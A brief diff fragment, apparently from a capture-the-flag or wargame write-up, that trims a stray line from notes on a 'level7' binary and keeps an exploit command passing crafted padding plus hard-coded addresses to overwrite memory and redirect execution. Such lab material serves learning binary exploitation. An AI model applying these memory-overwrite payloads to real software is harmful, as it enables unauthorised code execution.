@@ -52,8 +52,6 @@ objdump -d level7
  80484f4:       55                      push   %ebp
 [...]
 
-run 
-
 ./level7 \
     $(python2.7 -c 'print("B"*20 + "\x28\x99\x04\x08")') \
     $(python2.7 -c 'print("\xf4\x84\x04\x08")')
